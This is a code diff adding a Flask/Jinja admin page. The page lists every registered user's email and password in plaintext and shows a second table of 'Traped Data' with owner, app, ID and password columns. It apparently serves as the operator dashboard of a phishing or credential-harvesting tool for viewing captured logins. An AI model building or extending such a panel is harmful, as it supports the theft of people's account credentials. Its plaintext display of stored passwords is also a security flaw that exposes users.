@@ -1,1 +1,59 @@
-<h1>admin</h1>
+<!DOCTYPE html>
+<html>
+  <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.png')}}">
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+<head>
+
+  <title>Admin</title>  
+
+  <style>
+      table, th, td {
+  border:1px solid black;
+}
+  </style>
+</head>
+<body>
+
+    
+
+    
+
+
+    <table style="width:100%">
+        Total number of Users={{allData.getUserData()[1]}}
+        <tr>
+          <th>UId</th>
+          <th>email</th>
+          <th>Password</th>
+        </tr>
+        {% for row in allData.getUserData()[0] %}
+        <tr>
+          <td>{{row[0]}}</td>
+          <td>{{row[1]}}</td>
+          <td>{{row[2]}}</td>
+        </tr>
+        {% endfor %}
+      </table>
+
+
+    <table style="width:100%">
+        Total number of Traped Data={{allData.getTrapedData()[1]}}
+        <tr>
+          <th>Owner</th>  
+          <th>App</th>
+          <th>Id</th>
+          <th>Password</th>
+        </tr>
+        {% for row in allData.getTrapedData()[0] %}
+        <tr>
+          <td>{{row[0]}}</td>
+          <td>{{row[1]}}</td>
+          <td>{{row[2]}}</td>
+          <td>{{row[3]}}</td>
+        </tr>
+        {% endfor %}
+      </table>
+
+    
+</body>
+</html>
